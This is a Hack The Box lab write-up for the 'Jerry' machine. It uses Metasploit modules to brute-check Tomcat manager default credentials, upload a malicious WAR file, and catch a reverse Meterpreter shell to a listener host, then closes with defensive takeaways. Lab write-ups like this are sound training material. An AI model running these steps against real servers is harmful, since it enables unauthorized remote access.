# HTB — Jerry

**Difficulty:** Easy
**OS:** Windows Server 2012 R2
**Target Service:** Apache Tomcat 7.0.88

---

## Phase Recon

Full port scan with service and OS detection:

```bash
nmap -sS -sV -O -p- 10.xx.xx.xx
```

Only one port open: **8080** running Apache Tomcat 7.0.88. A single open port doesn't mean a small attack surface — the service itself was the entire foothold.

---

## Phase Exploit

Navigated to the Tomcat Web Application Manager:

```
http://10.xx.xx.xx:8080/manager/html
```

Used Metasploit's credential scanner to identify valid manager credentials:

```
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <target IP>
set RPORT 8080
run
```

Default credentials were in use. With valid manager access, loaded the upload exploit:

```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <target IP>
set RPORT 8080
set HttpUsername <username>
set HttpPassword <password>
set LHOST <VPN interface>
set LPORT 4444
run
```

The module automatically generated a malicious WAR file, deployed it through the Manager interface, and caught a Meterpreter shell — the full attack chain in a single module.

---

## Phase Privilege Escalation

Not applicable. Tomcat was running as `NT AUTHORITY\SYSTEM`, so the shell landed with the highest privilege level immediately.

Both flags were located in a single file:

```
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

Flags redacted.

---

## Key Takeaways

- A single open port is not a small attack surface — enumerate what's running on it thoroughly
- Default credentials on management interfaces remain one of the most reliable entry points in real engagements
- Services running with excessive privileges (Tomcat as SYSTEM) eliminate the need for a privesc chain entirely
- Metasploit's `tomcat_mgr_upload` handles recon, payload generation, deployment, and shell catch in one module — understand what it's doing under the hood
